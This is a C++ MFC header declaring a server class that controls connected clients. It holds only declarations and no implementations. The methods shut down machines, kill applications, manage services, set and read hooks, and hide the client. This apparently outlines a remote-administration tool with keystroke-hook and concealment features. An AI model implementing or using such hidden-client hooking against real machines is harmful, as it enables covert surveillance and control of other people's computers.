
// Server.h : main header file for the PROJECT_NAME application
//

#pragma once

#ifndef __AFXWIN_H__
	#error "include 'stdafx.h' before including this file for PCH"
#endif

#include "resource.h"		// main symbols
#include <afxsock.h>
#include <vector>
using namespace std;
#pragma warning(disable: 4996) 
// CServerApp:
// See Server.cpp for the implementation of this class
//

class ServerSock;
class ClientSock;

class CServerApp : public CWinApp
{
private:
	ServerSock* m_server;
	vector<ClientSock*> m_clients;
	ClientSock* m_selectedClient;
public:
	CServerApp();

// Overrides
public:
	virtual BOOL InitInstance();

// Implementation

	void initServer();
	void startListen();
	bool pushNewClient(ClientSock* newClient, CString &error);
	ClientSock* findClientByIP(CString ip);
	void setSelectedClientByIP(CString ip);

	void shutDown(CDialog* dlg);
	void SeeApplication(CDialog* dlg);
	void disconnectClient(CDialog* dlg);
	void startApplication(CDialog* dlg);
	void killApplication(CDialog* dlg);
	void seeService(CDialog* dlg);
	void startService(CDialog* dlg);
	void stopService(CDialog* dlg);

	void startHook(CDialog* dlg);
	void unHook(CDialog* dlg);
	void getHook(CDialog* dlg);

	void hideClient(CDialog* dlg);

	~CServerApp();
	DECLARE_MESSAGE_MAP()
};

extern CServerApp theApp;